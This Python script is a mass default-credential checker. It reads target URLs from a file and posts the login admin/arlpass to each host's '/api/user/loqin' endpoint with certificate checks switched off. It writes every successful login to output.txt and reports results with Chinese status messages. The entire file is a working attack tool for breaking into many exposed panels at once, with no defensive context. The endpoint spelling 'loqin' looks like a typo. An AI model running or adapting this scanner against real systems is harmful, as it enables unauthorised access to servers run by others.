# -*- coding: UTF-8 -*-
import requests
from urllib.parse import urljoin
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
result = {}
path = "/api/user/loqin"
with open("url.txt", "r") as file:
    urls = file.readlines()
for url in urls:
    url = url.strip()
    url = urljoin(url, path)
    payload = {"username": "admin", "password": "arlpass"}
    headers = {"content-type": "application/json"}
    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False, timeout=3)
        if resp and resp.status_code == 200 and "username" in resp.text:
            result['verifyInfo'] = {}
            result['verifyInfo']['URL'] = url
            result['verifyInfo']['Referer'] = payload
            result['verifyInfo']['msg'] = '登录成功'
            with open("output.txt", 'a') as output_file:
                output_file.write(str(result) + '\n')
        else:
            result['verifyInfo'] = {}
            result['verifyInfo']['URL'] = url
            result['verifyInfo']['msg'] = '登录失败'
    except Exception as ex:
        result['verifyInfo'] = {}
        result['verifyInfo']['URI'] = url
        result['verifyInfo']['msg'] = "请求失败"
    print(result)
